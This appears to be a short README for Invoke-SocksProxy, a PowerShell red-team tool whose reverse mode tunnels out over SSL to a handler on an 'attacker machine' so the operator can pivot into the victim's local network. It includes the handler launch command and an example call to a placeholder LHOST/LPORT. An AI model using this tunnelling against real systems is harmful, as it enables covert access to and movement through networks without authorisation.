# Invoke-SocksProxy
Creates a local or "reverse" Socks proxy using powershell. The local proxy is a simple Socks 4/5 proxy.

The reverse proxy creates a tcp tunnel by initiating outbond SSL connections that can go through the system's proxy. The tunnel can then be used as a socks proxy on the remote host to pivot into the local host's network.

Merged the script from tokyoneon and from p3nt4 so it works. *Note* Firewall might be on high ports will most likely not work. Run the script, and copy the SHA1 cert fingerprint and past in the the script:
```
sudo python2.7 ReverseSocksProxyHandler.py
```

# Example
Connect back to ProxyHandler on attacker machine with certificate fingerprint.
```
Invoke-ReverseSocksProxy -remotePort LPORT -remoteHost LHOST -certFingerprint 'SHA_FINGERPRINT'
```
